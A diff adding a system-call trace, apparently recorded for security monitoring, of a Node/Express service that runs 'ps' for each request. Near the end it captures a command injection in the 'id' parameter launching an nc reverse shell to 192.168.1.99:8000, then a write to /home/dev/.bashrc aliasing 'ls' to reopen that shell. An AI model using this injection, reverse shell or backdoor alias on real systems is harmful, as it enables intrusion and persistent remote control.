@@ -1,0 +1,461 @@
+node 23642 192.168.1.1:49947->172.18.0.2:3000 accept4 fd=19(<4t>192.168.1.1:49947->172.18.0.2:3000) tuple=192.168.1.1:49947->172.18.0.2:3000 queuepct=0 queuelen=0 queuemax=511 
+node 23642  setsockopt res=0 fd=19(<4t>192.168.1.1:49947->172.18.0.2:3000) level=2(SOL_TCP) optname=0(UNKNOWN) val=.... optlen=4 
+node 23642 192.168.1.1:49947->172.18.0.2:3000 read fd=19(<4t>192.168.1.1:49947->172.18.0.2:3000) size=65536 
+node 23642 192.168.1.1:49947->172.18.0.2:3000 read res=383 data=GET /proc?id=666 HTTP/1.1..Host: 192.168.1.72:3000..User-Agent: Mozilla/5.0 (Win 
+node 23642  socketpair res=0 fd1=20(<u>) fd2=21(<u>) source=FFFF9D93CB24D940 peer=FFFF9D93CB24CC80 
+node 23642  socketpair res=0 fd1=22(<u>) fd2=23(<u>) source=FFFF9D93CB24A200 peer=FFFF9D93CB24AEC0 
+node 23642  socketpair res=0 fd1=24(<u>) fd2=25(<u>) source=FFFF9D93CB249DC0 peer=FFFF9D93CB249100 
+node 23642 pipe:[113484] read fd=4(<p>pipe:[113484]) size=1 
+node 23642 pipe:[113484] read res=1 data=* 
+node 23642 pipe:[113484] write fd=5(<p>pipe:[113484]) size=1 
+node 23642 pipe:[113484] write res=1 data=* 
+node 23642  pipe2 res=0 fd1=26(<p>) fd2=27(<p>) ino=113499 flags=4096(O_CLOEXEC) 
+node 23741 pipe:[113484] close fd=4(<p>pipe:[113484]) 
+node 23642  close fd=27(<p>) 
+node 23741 pipe:[113484] close res=0 
+node 23642  close res=0 
+node 23642  read fd=26(<p>) size=4 
+node 23741 pipe:[113484] close fd=5(<p>pipe:[113484]) 
+node 23741 pipe:[113484] close res=0 
+node 23741  pipe2 res=0 fd1=4(<p>) fd2=5(<p>) ino=113694 flags=4096(O_CLOEXEC) 
+node 23741  write fd=5(<p>) size=1 
+node 23741  write res=1 data=* 
+node 23741  dup2 fd=21(<u>) 
+node 23741  dup2 res=0(<u>) oldfd=21(<u>) newfd=0(<u>) 
+node 23741  fcntl fd=0(<u>) cmd=4(F_GETFL) 
+node 23741  fcntl res=2(<p>pipe:[113443]) fd=0(<u>) cmd=4(F_GETFL) 
+node 23741  dup2 fd=23(<u>) 
+node 23741  dup2 res=1(<u>) oldfd=23(<u>) newfd=1(<u>) 
+node 23741  fcntl fd=1(<u>) cmd=4(F_GETFL) 
+node 23741  fcntl res=2(<p>pipe:[113443]) fd=1(<u>) cmd=4(F_GETFL) 
+node 23741  dup2 fd=25(<u>) 
+node 23741  dup2 res=2(<u>) oldfd=25(<u>) newfd=2(<u>) 
+node 23741  fcntl fd=2(<u>) cmd=4(F_GETFL) 
+node 23741  fcntl res=2(<u>) fd=2(<u>) cmd=4(F_GETFL) 
+node 23642  read res=0 data=NULL 
+node 23642  close fd=26(<p>) 
+node 23642  close res=0 
+node 23642  close fd=21(<u>) 
+node 23642  close res=0 
+node 23642  ioctl fd=20(<u>) request=5421 argument=7FFDBBA578EC 
+node 23642  ioctl res=0 
+node 23642  close fd=23(<u>) 
+node 23642  close res=0 
+node 23642  ioctl fd=22(<u>) request=5421 argument=7FFDBBA578EC 
+node 23642  ioctl res=0 
+node 23642  close fd=25(<u>) 
+node 23642  close res=0 
+node 23642  ioctl fd=24(<u>) request=5421 argument=7FFDBBA578EC 
+node 23642  ioctl res=0 
+ps 23741  writev fd=2(<u>) size=2 
+ps 23741  writev res=2 data=ps 
+ps 23741  writev fd=2(<u>) size=23 
+ps 23741  writev res=23 data=: unrecognized option:  
+ps 23741  writev fd=2(<u>) size=1 
+ps 23741  writev res=1 data=p 
+ps 23741  writev fd=2(<u>) size=1 
+ps 23741  writev res=1 data=. 
+node 23642  read fd=24(<u>) size=65536 
+node 23642  read res=27 data=ps: unrecognized option: p. 
+ps 23741  write fd=2(<u>) size=41 
+ps 23741  write res=41 data=BusyBox v1.37.0 (2025-01-17 18:12:01 UTC) 
+ps 23741  write fd=2(<u>) size=20 
+ps 23741  write res=20 data= multi-call binary.. 
+ps 23741  write fd=2(<u>) size=8 
+ps 23741  write res=8 data=.Usage:  
+ps 23741  write fd=2(<u>) size=2 
+ps 23741  write res=2 data=ps 
+ps 23741  write fd=2(<u>) size=1 
+ps 23741  write res=1 data=  
+ps 23741  write fd=2(<u>) size=118 
+ps 23741  write res=118 data=[-o COL1,COL2=HEADER] [-T]..Show list of processes...-o COL1,COL2=HEADER.Select  
+ps 23741  write fd=2(<u>) size=1 
+ps 23741  write res=1 data=. 
+node 23642  read fd=24(<u>) size=65536 
+node 23642  read res=191 data=BusyBox v1.37.0 (2025-01-17 18:12:01 UTC) multi-call binary...Usage: ps [-o COL1 
+node 23642 pipe:[113484] read fd=4(<p>pipe:[113484]) size=1 
+node 23642 pipe:[113484] read res=1 data=* 
+node 23642 pipe:[113486] write fd=15(<p>pipe:[113486]) size=16 
+node 23642 pipe:[113486] write res=16 data=....'V.......... 
+node 23642 pipe:[113484] write fd=5(<p>pipe:[113484]) size=1 
+node 23642 pipe:[113484] write res=1 data=* 
+node 23642  read fd=24(<u>) size=65536 
+node 23642  read res=0 data=NULL 
+node 23642  shutdown fd=24(<u>) how=1(SHUT_WR) 
+node 23642  shutdown res=0 
+node 23642  close fd=24(<u>) 
+node 23642  close res=0 
+node 23642  read fd=22(<u>) size=65536 
+node 23642  read res=0 data=NULL 
+node 23642  shutdown fd=22(<u>) how=1(SHUT_WR) 
+node 23642  shutdown res=0 
+node 23642  close fd=22(<u>) 
+node 23642  close res=0 
+node 23642 pipe:[113486] read fd=14(<p>pipe:[113486]) size=512 
+node 23642 pipe:[113486] read res=16 data=....'V.......... 
+node 23642  close fd=20(<u>) 
+node 23642  close res=0 
+node 23642 pipe:[113484] read fd=4(<p>pipe:[113484]) size=1 
+node 23642 pipe:[113484] read res=1 data=* 
+node 23642 pipe:[113484] write fd=5(<p>pipe:[113484]) size=1 
+node 23642 pipe:[113484] write res=1 data=* 
+node 23642 /etc/localtime open fd=-2(ENOENT) name=/etc/localtime flags=6209(O_LARGEFILE|O_NONBLOCK|O_RDONLY|O_CLOEXEC) mode=0 dev=0 ino=0 
+node 23642 /usr/share/zoneinfo/ open fd=-2(ENOENT) name=/usr/share/zoneinfo/ flags=15361(O_LARGEFILE|O_DIRECTORY|O_RDONLY|O_CLOEXEC|O_TMPFILE) mode=0 dev=0 ino=0 
+node 23642 192.168.1.1:49947->172.18.0.2:3000 writev fd=19(<4t>192.168.1.1:49947->172.18.0.2:3000) size=291 
+node 23642 192.168.1.1:49947->172.18.0.2:3000 writev res=291 data=HTTP/1.1 404 Not Found..X-Powered-By: Express..Content-Type: application/json; c 
+node 23642 192.168.1.1:49947->172.18.0.2:3000 read fd=19(<4t>192.168.1.1:49947->172.18.0.2:3000) size=65536 
+node 23642 192.168.1.1:49947->172.18.0.2:3000 read res=383 data=GET /proc?id=667 HTTP/1.1..Host: 192.168.1.72:3000..User-Agent: Mozilla/5.0 (Win 
+node 23642  socketpair res=0 fd1=20(<u>) fd2=21(<u>) source=FFFF9D92C130E1C0 peer=FFFF9D92C130EA40 
+node 23642  socketpair res=0 fd1=22(<u>) fd2=23(<u>) source=FFFF9D92C130BFC0 peer=FFFF9D92C130C400 
+node 23642  socketpair res=0 fd1=24(<u>) fd2=25(<u>) source=FFFF9D92C130D940 peer=FFFF9D92C130AA80 
+node 23642 pipe:[113484] read fd=4(<p>pipe:[113484]) size=1 
+node 23642 pipe:[113484] read res=1 data=* 
+node 23642 pipe:[113484] write fd=5(<p>pipe:[113484]) size=1 
+node 23642 pipe:[113484] write res=1 data=* 
+node 23642  pipe2 res=0 fd1=26(<p>) fd2=27(<p>) ino=103982 flags=4096(O_CLOEXEC) 
+node 23642  close fd=27(<p>) 
+node 23642  close res=0 
+node 23642  read fd=26(<p>) size=4 
+node 23742 pipe:[113484] close fd=4(<p>pipe:[113484]) 
+node 23742 pipe:[113484] close res=0 
+node 23742 pipe:[113484] close fd=5(<p>pipe:[113484]) 
+node 23742 pipe:[113484] close res=0 
+node 23742  pipe2 res=0 fd1=4(<p>) fd2=5(<p>) ino=111841 flags=4096(O_CLOEXEC) 
+node 23742  write fd=5(<p>) size=1 
+node 23742  write res=1 data=* 
+node 23742  dup2 fd=21(<u>) 
+node 23742  dup2 res=0(<u>) oldfd=21(<u>) newfd=0(<u>) 
+node 23742  fcntl fd=0(<u>) cmd=4(F_GETFL) 
+node 23742  fcntl res=2(<p>pipe:[113443]) fd=0(<u>) cmd=4(F_GETFL) 
+node 23742  dup2 fd=23(<u>) 
+node 23742  dup2 res=1(<u>) oldfd=23(<u>) newfd=1(<u>) 
+node 23742  fcntl fd=1(<u>) cmd=4(F_GETFL) 
+node 23742  fcntl res=2(<p>pipe:[113443]) fd=1(<u>) cmd=4(F_GETFL) 
+node 23742  dup2 fd=25(<u>) 
+node 23742  dup2 res=2(<u>) oldfd=25(<u>) newfd=2(<u>) 
+node 23742  fcntl fd=2(<u>) cmd=4(F_GETFL) 
+node 23742  fcntl res=2(<u>) fd=2(<u>) cmd=4(F_GETFL) 
+node 23642  read res=0 data=NULL 
+node 23642  close fd=26(<p>) 
+node 23642  close res=0 
+node 23642  close fd=21(<u>) 
+node 23642  close res=0 
+node 23642  ioctl fd=20(<u>) request=5421 argument=7FFDBBA578EC 
+node 23642  ioctl res=0 
+node 23642  close fd=23(<u>) 
+node 23642  close res=0 
+node 23642  ioctl fd=22(<u>) request=5421 argument=7FFDBBA578EC 
+node 23642  ioctl res=0 
+node 23642  close fd=25(<u>) 
+node 23642  close res=0 
+node 23642  ioctl fd=24(<u>) request=5421 argument=7FFDBBA578EC 
+node 23642  ioctl res=0 
+ps 23742  writev fd=2(<u>) size=2 
+ps 23742  writev res=2 data=ps 
+ps 23742  writev fd=2(<u>) size=23 
+ps 23742  writev res=23 data=: unrecognized option:  
+ps 23742  writev fd=2(<u>) size=1 
+ps 23742  writev res=1 data=p 
+ps 23742  writev fd=2(<u>) size=1 
+ps 23742  writev res=1 data=. 
+node 23642  read fd=24(<u>) size=65536 
+node 23642  read res=27 data=ps: unrecognized option: p. 
+ps 23742  write fd=2(<u>) size=41 
+ps 23742  write res=41 data=BusyBox v1.37.0 (2025-01-17 18:12:01 UTC) 
+ps 23742  write fd=2(<u>) size=20 
+ps 23742  write res=20 data= multi-call binary.. 
+ps 23742  write fd=2(<u>) size=8 
+ps 23742  write res=8 data=.Usage:  
+ps 23742  write fd=2(<u>) size=2 
+ps 23742  write res=2 data=ps 
+ps 23742  write fd=2(<u>) size=1 
+ps 23742  write res=1 data=  
+ps 23742  write fd=2(<u>) size=118 
+ps 23742  write res=118 data=[-o COL1,COL2=HEADER] [-T]..Show list of processes...-o COL1,COL2=HEADER.Select  
+ps 23742  write fd=2(<u>) size=1 
+ps 23742  write res=1 data=. 
+node 23642  read fd=24(<u>) size=65536 
+node 23642  read res=191 data=BusyBox v1.37.0 (2025-01-17 18:12:01 UTC) multi-call binary...Usage: ps [-o COL1 
+node 23642 pipe:[113484] read fd=4(<p>pipe:[113484]) size=1 
+node 23642 pipe:[113484] read res=1 data=* 
+node 23642 pipe:[113486] write fd=15(<p>pipe:[113486]) size=16 
+node 23642 pipe:[113486] write res=16 data=....'V.......... 
+node 23642 pipe:[113484] write fd=5(<p>pipe:[113484]) size=1 
+node 23642 pipe:[113484] write res=1 data=* 
+node 23642  read fd=24(<u>) size=65536 
+node 23642  read res=0 data=NULL 
+node 23642  shutdown fd=24(<u>) how=1(SHUT_WR) 
+node 23642  shutdown res=0 
+node 23642  close fd=24(<u>) 
+node 23642  close res=0 
+node 23642  read fd=22(<u>) size=65536 
+node 23642  read res=0 data=NULL 
+node 23642  shutdown fd=22(<u>) how=1(SHUT_WR) 
+node 23642  shutdown res=0 
+node 23642  close fd=22(<u>) 
+node 23642  close res=0 
+node 23642 pipe:[113486] read fd=14(<p>pipe:[113486]) size=512 
+node 23642 pipe:[113486] read res=16 data=....'V.......... 
+node 23642  close fd=20(<u>) 
+node 23642  close res=0 
+node 23642 pipe:[113484] read fd=4(<p>pipe:[113484]) size=1 
+node 23642 pipe:[113484] read res=1 data=* 
+node 23642 pipe:[113484] write fd=5(<p>pipe:[113484]) size=1 
+node 23642 pipe:[113484] write res=1 data=* 
+node 23642 192.168.1.1:49947->172.18.0.2:3000 writev fd=19(<4t>192.168.1.1:49947->172.18.0.2:3000) size=291 
+node 23642 192.168.1.1:49947->172.18.0.2:3000 writev res=291 data=HTTP/1.1 404 Not Found..X-Powered-By: Express..Content-Type: application/json; c 
+node 23642 192.168.1.99:34170->172.18.0.2:3000 accept4 fd=20(<4t>192.168.1.99:34170->172.18.0.2:3000) tuple=192.168.1.99:34170->172.18.0.2:3000 queuepct=0 queuelen=0 queuemax=511 
+node 23642  setsockopt res=0 fd=20(<4t>192.168.1.99:34170->172.18.0.2:3000) level=2(SOL_TCP) optname=0(UNKNOWN) val=.... optlen=4 
+node 23642 192.168.1.99:34170->172.18.0.2:3000 read fd=20(<4t>192.168.1.99:34170->172.18.0.2:3000) size=65536 
+node 23642 192.168.1.99:34170->172.18.0.2:3000 read res=89 data=GET /proc?id=1 HTTP/1.1..Host: 192.168.1.72:3000..User-Agent: curl/8.8.0..Accept 
+node 23642  socketpair res=0 fd1=21(<u>) fd2=22(<u>) source=FFFF9D93CB316A40 peer=FFFF9D93CB312640 
+node 23642  socketpair res=0 fd1=23(<u>) fd2=24(<u>) source=FFFF9D93CB311100 peer=FFFF9D93CB311DC0 
+node 23642  socketpair res=0 fd1=25(<u>) fd2=26(<u>) source=FFFF9D93CB314C80 peer=FFFF9D93CB316600 
+node 23642 pipe:[113484] read fd=4(<p>pipe:[113484]) size=1 
+node 23642 pipe:[113484] read res=1 data=* 
+node 23642 pipe:[113484] write fd=5(<p>pipe:[113484]) size=1 
+node 23642 pipe:[113484] write res=1 data=* 
+node 23642  pipe2 res=0 fd1=27(<p>) fd2=28(<p>) ino=115713 flags=4096(O_CLOEXEC) 
+node 23642  close fd=28(<p>) 
+node 23642  close res=0 
+node 23642  read fd=27(<p>) size=4 
+node 23743 pipe:[113484] close fd=4(<p>pipe:[113484]) 
+node 23743 pipe:[113484] close res=0 
+node 23743 pipe:[113484] close fd=5(<p>pipe:[113484]) 
+node 23743 pipe:[113484] close res=0 
+node 23743  pipe2 res=0 fd1=4(<p>) fd2=5(<p>) ino=113695 flags=4096(O_CLOEXEC) 
+node 23743  write fd=5(<p>) size=1 
+node 23743  write res=1 data=* 
+node 23743  dup2 fd=22(<u>) 
+node 23743  dup2 res=0(<u>) oldfd=22(<u>) newfd=0(<u>) 
+node 23743  fcntl fd=0(<u>) cmd=4(F_GETFL) 
+node 23743  fcntl res=2(<p>pipe:[113443]) fd=0(<u>) cmd=4(F_GETFL) 
+node 23743  dup2 fd=24(<u>) 
+node 23743  dup2 res=1(<u>) oldfd=24(<u>) newfd=1(<u>) 
+node 23743  fcntl fd=1(<u>) cmd=4(F_GETFL) 
+node 23743  fcntl res=2(<p>pipe:[113443]) fd=1(<u>) cmd=4(F_GETFL) 
+node 23743  dup2 fd=26(<u>) 
+node 23743  dup2 res=2(<u>) oldfd=26(<u>) newfd=2(<u>) 
+node 23743  fcntl fd=2(<u>) cmd=4(F_GETFL) 
+node 23743  fcntl res=2(<u>) fd=2(<u>) cmd=4(F_GETFL) 
+node 23642  read res=0 data=NULL 
+node 23642  close fd=27(<p>) 
+node 23642  close res=0 
+node 23642  close fd=22(<u>) 
+node 23642  close res=0 
+node 23642  ioctl fd=21(<u>) request=5421 argument=7FFDBBA578EC 
+node 23642  ioctl res=0 
+node 23642  close fd=24(<u>) 
+node 23642  close res=0 
+node 23642  ioctl fd=23(<u>) request=5421 argument=7FFDBBA578EC 
+node 23642  ioctl res=0 
+node 23642  close fd=26(<u>) 
+node 23642  close res=0 
+node 23642  ioctl fd=25(<u>) request=5421 argument=7FFDBBA578EC 
+node 23642  ioctl res=0 
+ps 23743  writev fd=2(<u>) size=2 
+ps 23743  writev res=2 data=ps 
+ps 23743  writev fd=2(<u>) size=23 
+ps 23743  writev res=23 data=: unrecognized option:  
+ps 23743  writev fd=2(<u>) size=1 
+ps 23743  writev res=1 data=p 
+ps 23743  writev fd=2(<u>) size=1 
+ps 23743  writev res=1 data=. 
+node 23642  read fd=25(<u>) size=65536 
+node 23642  read res=27 data=ps: unrecognized option: p. 
+ps 23743  write fd=2(<u>) size=41 
+ps 23743  write res=41 data=BusyBox v1.37.0 (2025-01-17 18:12:01 UTC) 
+ps 23743  write fd=2(<u>) size=20 
+ps 23743  write res=20 data= multi-call binary.. 
+ps 23743  write fd=2(<u>) size=8 
+ps 23743  write res=8 data=.Usage:  
+ps 23743  write fd=2(<u>) size=2 
+ps 23743  write res=2 data=ps 
+ps 23743  write fd=2(<u>) size=1 
+ps 23743  write res=1 data=  
+ps 23743  write fd=2(<u>) size=118 
+ps 23743  write res=118 data=[-o COL1,COL2=HEADER] [-T]..Show list of processes...-o COL1,COL2=HEADER.Select  
+ps 23743  write fd=2(<u>) size=1 
+ps 23743  write res=1 data=. 
+node 23642  read fd=25(<u>) size=65536 
+node 23642  read res=191 data=BusyBox v1.37.0 (2025-01-17 18:12:01 UTC) multi-call binary...Usage: ps [-o COL1 
+node 23642 pipe:[113484] read fd=4(<p>pipe:[113484]) size=1 
+node 23642 pipe:[113484] read res=1 data=* 
+node 23642 pipe:[113486] write fd=15(<p>pipe:[113486]) size=16 
+node 23642 pipe:[113486] write res=16 data=....'V.......... 
+node 23642 pipe:[113484] write fd=5(<p>pipe:[113484]) size=1 
+node 23642 pipe:[113484] write res=1 data=* 
+node 23642  read fd=25(<u>) size=65536 
+node 23642  read res=0 data=NULL 
+node 23642  shutdown fd=25(<u>) how=1(SHUT_WR) 
+node 23642  shutdown res=0 
+node 23642  close fd=25(<u>) 
+node 23642  close res=0 
+node 23642  read fd=23(<u>) size=65536 
+node 23642  read res=0 data=NULL 
+node 23642  shutdown fd=23(<u>) how=1(SHUT_WR) 
+node 23642  shutdown res=0 
+node 23642  close fd=23(<u>) 
+node 23642  close res=0 
+node 23642 pipe:[113486] read fd=14(<p>pipe:[113486]) size=512 
+node 23642 pipe:[113486] read res=16 data=....'V.......... 
+node 23642  close fd=21(<u>) 
+node 23642  close res=0 
+node 23642 pipe:[113484] read fd=4(<p>pipe:[113484]) size=1 
+node 23642 pipe:[113484] read res=1 data=* 
+node 23642 pipe:[113484] write fd=5(<p>pipe:[113484]) size=1 
+node 23642 pipe:[113484] write res=1 data=* 
+node 23642 192.168.1.99:34170->172.18.0.2:3000 writev fd=20(<4t>192.168.1.99:34170->172.18.0.2:3000) size=289 
+node 23642 192.168.1.99:34170->172.18.0.2:3000 writev res=289 data=HTTP/1.1 404 Not Found..X-Powered-By: Express..Content-Type: application/json; c 
+node 23642 192.168.1.99:34170->172.18.0.2:3000 read fd=20(<4t>192.168.1.99:34170->172.18.0.2:3000) size=65536 
+node 23642 192.168.1.99:34170->172.18.0.2:3000 read res=0 data=NULL 
+node 23642 192.168.1.99:34170->172.18.0.2:3000 shutdown fd=20(<4t>192.168.1.99:34170->172.18.0.2:3000) how=1(SHUT_WR) 
+node 23642 192.168.1.99:34170->172.18.0.2:3000 shutdown res=0 
+node 23642 192.168.1.99:34170->172.18.0.2:3000 close fd=20(<4t>192.168.1.99:34170->172.18.0.2:3000) 
+node 23642 192.168.1.99:34170->172.18.0.2:3000 close res=0 
+node 23642 192.168.1.99:34180->172.18.0.2:3000 accept4 fd=20(<4t>192.168.1.99:34180->172.18.0.2:3000) tuple=192.168.1.99:34180->172.18.0.2:3000 queuepct=0 queuelen=0 queuemax=511 
+node 23642  setsockopt res=0 fd=20(<4t>192.168.1.99:34180->172.18.0.2:3000) level=2(SOL_TCP) optname=0(UNKNOWN) val=.... optlen=4 
+node 23642 192.168.1.99:34180->172.18.0.2:3000 read fd=20(<4t>192.168.1.99:34180->172.18.0.2:3000) size=65536 
+node 23642 192.168.1.99:34180->172.18.0.2:3000 read res=116 data=GET /proc?id=1;nc+192.168.1.99+8000+-e+sh HTTP/1.1..Host: 192.168.1.72:3000..Use 
+node 23642  socketpair res=0 fd1=21(<u>) fd2=22(<u>) source=FFFF9D92C130B300 peer=FFFF9D92C130F700 
+node 23642  socketpair res=0 fd1=23(<u>) fd2=24(<u>) source=FFFF9D92C130B740 peer=FFFF9D92C1308000 
+node 23642  socketpair res=0 fd1=25(<u>) fd2=26(<u>) source=FFFF9D92C1308440 peer=FFFF9D92C130EE80 
+node 23642 pipe:[113484] read fd=4(<p>pipe:[113484]) size=1 
+node 23642 pipe:[113484] read res=1 data=* 
+node 23642 pipe:[113484] write fd=5(<p>pipe:[113484]) size=1 
+node 23642 pipe:[113484] write res=1 data=* 
+node 23642  pipe2 res=0 fd1=27(<p>) fd2=28(<p>) ino=103990 flags=4096(O_CLOEXEC) 
+node 23642  close fd=28(<p>) 
+node 23642  close res=0 
+node 23642  read fd=27(<p>) size=4 
+node 23744 pipe:[113484] close fd=4(<p>pipe:[113484]) 
+node 23744 pipe:[113484] close res=0 
+node 23744 pipe:[113484] close fd=5(<p>pipe:[113484]) 
+node 23744 pipe:[113484] close res=0 
+node 23744  pipe2 res=0 fd1=4(<p>) fd2=5(<p>) ino=115714 flags=4096(O_CLOEXEC) 
+node 23744  write fd=5(<p>) size=1 
+node 23744  write res=1 data=* 
+node 23744  dup2 fd=22(<u>) 
+node 23744  dup2 res=0(<u>) oldfd=22(<u>) newfd=0(<u>) 
+node 23744  fcntl fd=0(<u>) cmd=4(F_GETFL) 
+node 23744  fcntl res=2(<p>pipe:[113443]) fd=0(<u>) cmd=4(F_GETFL) 
+node 23744  dup2 fd=24(<u>) 
+node 23744  dup2 res=1(<u>) oldfd=24(<u>) newfd=1(<u>) 
+node 23744  fcntl fd=1(<u>) cmd=4(F_GETFL) 
+node 23744  fcntl res=2(<p>pipe:[113443]) fd=1(<u>) cmd=4(F_GETFL) 
+node 23744  dup2 fd=26(<u>) 
+node 23744  dup2 res=2(<u>) oldfd=26(<u>) newfd=2(<u>) 
+node 23744  fcntl fd=2(<u>) cmd=4(F_GETFL) 
+node 23744  fcntl res=2(<u>) fd=2(<u>) cmd=4(F_GETFL) 
+node 23642  read res=0 data=NULL 
+node 23642  close fd=27(<p>) 
+node 23642  close res=0 
+node 23642  close fd=22(<u>) 
+node 23642  close res=0 
+node 23642  ioctl fd=21(<u>) request=5421 argument=7FFDBBA578EC 
+node 23642  ioctl res=0 
+node 23642  close fd=24(<u>) 
+node 23642  close res=0 
+node 23642  ioctl fd=23(<u>) request=5421 argument=7FFDBBA578EC 
+node 23642  ioctl res=0 
+node 23642  close fd=26(<u>) 
+node 23642  close res=0 
+node 23642  ioctl fd=25(<u>) request=5421 argument=7FFDBBA578EC 
+node 23642  ioctl res=0 
+ps 23745  writev fd=2(<u>) size=2 
+ps 23745  writev res=2 data=ps 
+ps 23745  writev fd=2(<u>) size=23 
+ps 23745  writev res=23 data=: unrecognized option:  
+ps 23745  writev fd=2(<u>) size=1 
+ps 23745  writev res=1 data=p 
+ps 23745  writev fd=2(<u>) size=1 
+ps 23745  writev res=1 data=. 
+node 23642  read fd=25(<u>) size=65536 
+node 23642  read res=27 data=ps: unrecognized option: p. 
+ps 23745  write fd=2(<u>) size=41 
+ps 23745  write res=41 data=BusyBox v1.37.0 (2025-01-17 18:12:01 UTC) 
+ps 23745  write fd=2(<u>) size=20 
+ps 23745  write res=20 data= multi-call binary.. 
+ps 23745  write fd=2(<u>) size=8 
+ps 23745  write res=8 data=.Usage:  
+ps 23745  write fd=2(<u>) size=2 
+ps 23745  write res=2 data=ps 
+ps 23745  write fd=2(<u>) size=1 
+ps 23745  write res=1 data=  
+ps 23745  write fd=2(<u>) size=118 
+ps 23745  write res=118 data=[-o COL1,COL2=HEADER] [-T]..Show list of processes...-o COL1,COL2=HEADER.Select  
+ps 23745  write fd=2(<u>) size=1 
+ps 23745  write res=1 data=. 
+node 23642  read fd=25(<u>) size=65536 
+node 23642  read res=191 data=BusyBox v1.37.0 (2025-01-17 18:12:01 UTC) multi-call binary...Usage: ps [-o COL1 
+nc 23744  socket fd=3(<4>) 
+nc 23744  setsockopt res=0 fd=3(<4>) level=1(SOL_SOCKET) optname=2(SO_REUSEADDR) val=1 optlen=4 
+nc 23744  bind fd=3(<4>) 
+nc 23744 0.0.0.0:0 bind res=0 addr=0.0.0.0:0 
+nc 23744  close fd=0(<u>) 
+nc 23744  close res=0 
+nc 23744 0.0.0.0:0 connect fd=3(<4>0.0.0.0:0) addr=192.168.1.99:8000 
+nc 23744 172.18.0.2:46285->192.168.1.99:8000 connect res=0 tuple=172.18.0.2:46285->192.168.1.99:8000 fd=3(<4t>172.18.0.2:46285->192.168.1.99:8000) 
+nc 23744 172.18.0.2:46285->192.168.1.99:8000 dup2 fd=3(<4t>172.18.0.2:46285->192.168.1.99:8000) 
+nc 23744 172.18.0.2:46285->192.168.1.99:8000 dup2 res=0(<4t>172.18.0.2:46285->192.168.1.99:8000) oldfd=3(<4t>172.18.0.2:46285->192.168.1.99:8000) newfd=0(<4t>172.18.0.2:46285->192.168.1.99:8000) 
+nc 23744 172.18.0.2:46285->192.168.1.99:8000 close fd=3(<4t>172.18.0.2:46285->192.168.1.99:8000) 
+nc 23744 172.18.0.2:46285->192.168.1.99:8000 close res=0 
+nc 23744 172.18.0.2:46285->192.168.1.99:8000 dup2 fd=0(<4t>172.18.0.2:46285->192.168.1.99:8000) 
+nc 23744 172.18.0.2:46285->192.168.1.99:8000 dup2 res=1(<4t>172.18.0.2:46285->192.168.1.99:8000) oldfd=0(<4t>172.18.0.2:46285->192.168.1.99:8000) newfd=1(<4t>172.18.0.2:46285->192.168.1.99:8000) 
+node 23642  read fd=23(<u>) size=65536 
+node 23642  read res=0 data=NULL 
+node 23642  shutdown fd=23(<u>) how=1(SHUT_WR) 
+node 23642  shutdown res=0 
+node 23642  close fd=23(<u>) 
+node 23642  close res=0 
+sh 23744 172.18.0.2:46285->192.168.1.99:8000 ioctl fd=0(<4t>172.18.0.2:46285->192.168.1.99:8000) request=5413 argument=7FFE2C278248 
+sh 23744 172.18.0.2:46285->192.168.1.99:8000 ioctl res=-25(ENOTTY) 
+sh 23744 172.18.0.2:46285->192.168.1.99:8000 read fd=0(<4t>172.18.0.2:46285->192.168.1.99:8000) size=2047 
+node 23642 192.168.1.1:49947->172.18.0.2:3000 close fd=19(<4t>192.168.1.1:49947->172.18.0.2:3000) 
+node 23642 192.168.1.1:49947->172.18.0.2:3000 close res=0 
+sh 23744 172.18.0.2:46285->192.168.1.99:8000 read res=75 data=echo "alias ls='nc 192.168.1.99 8000 -e /bin/sh &;ls'" > /home/dev/.bashrc. 
+sh 23744 /home/dev/.bashrc open fd=3(<f>/home/dev/.bashrc) name=/home/dev/.bashrc flags=35078(O_LARGEFILE|O_TRUNC|O_CREAT|O_WRONLY) mode=0666 dev=31 ino=2123344 
+sh 23744 172.18.0.2:46285->192.168.1.99:8000 fcntl fd=1(<4t>172.18.0.2:46285->192.168.1.99:8000) cmd=26(F_DUPFD_CLOEXEC) 
+sh 23744 172.18.0.2:46285->192.168.1.99:8000 fcntl res=10(<4t>172.18.0.2:46285->192.168.1.99:8000) fd=1(<4t>172.18.0.2:46285->192.168.1.99:8000) cmd=26(F_DUPFD_CLOEXEC) 
+sh 23744 172.18.0.2:46285->192.168.1.99:8000 fcntl fd=10(<4t>172.18.0.2:46285->192.168.1.99:8000) cmd=3(F_SETFD) 
+sh 23744 172.18.0.2:46285->192.168.1.99:8000 fcntl res=0(<4t>172.18.0.2:46285->192.168.1.99:8000) fd=10(<4t>172.18.0.2:46285->192.168.1.99:8000) cmd=3(F_SETFD) 
+sh 23744 /home/dev/.bashrc dup2 fd=3(<f>/home/dev/.bashrc) 
+sh 23744 /home/dev/.bashrc dup2 res=1(<f>/home/dev/.bashrc) oldfd=3(<f>/home/dev/.bashrc) newfd=1(<f>/home/dev/.bashrc) 
+sh 23744 /home/dev/.bashrc close fd=3(<f>/home/dev/.bashrc) 
+sh 23744 /home/dev/.bashrc close res=0 
+sh 23744 /home/dev/.bashrc write fd=1(<f>/home/dev/.bashrc) size=48 
+sh 23744 /home/dev/.bashrc write res=48 data=alias ls='nc 192.168.1.99 8000 -e /bin/sh &;ls'. 
+sh 23744 172.18.0.2:46285->192.168.1.99:8000 dup2 fd=10(<4t>172.18.0.2:46285->192.168.1.99:8000) 
+sh 23744 172.18.0.2:46285->192.168.1.99:8000 dup2 res=1(<4t>172.18.0.2:46285->192.168.1.99:8000) oldfd=10(<4t>172.18.0.2:46285->192.168.1.99:8000) newfd=1(<4t>172.18.0.2:46285->192.168.1.99:8000) 
+sh 23744 172.18.0.2:46285->192.168.1.99:8000 close fd=10(<4t>172.18.0.2:46285->192.168.1.99:8000) 
+sh 23744 172.18.0.2:46285->192.168.1.99:8000 close res=0 
+sh 23744 172.18.0.2:46285->192.168.1.99:8000 read fd=0(<4t>172.18.0.2:46285->192.168.1.99:8000) size=2047 
+sh 23744 172.18.0.2:46285->192.168.1.99:8000 read res=0 data=NULL 
+node 23642  read fd=25(<u>) size=65536 
+node 23642  read res=0 data=NULL 
+node 23642 pipe:[113484] read fd=4(<p>pipe:[113484]) size=1 
+node 23642 pipe:[113484] read res=1 data=* 
+node 23642 pipe:[113486] write fd=15(<p>pipe:[113486]) size=16 
+node 23642 pipe:[113486] write res=16 data=....'V.......... 
+node 23642 pipe:[113484] write fd=5(<p>pipe:[113484]) size=1 
+node 23642 pipe:[113484] write res=1 data=* 
+node 23642  shutdown fd=25(<u>) how=1(SHUT_WR) 
+node 23642  shutdown res=0 
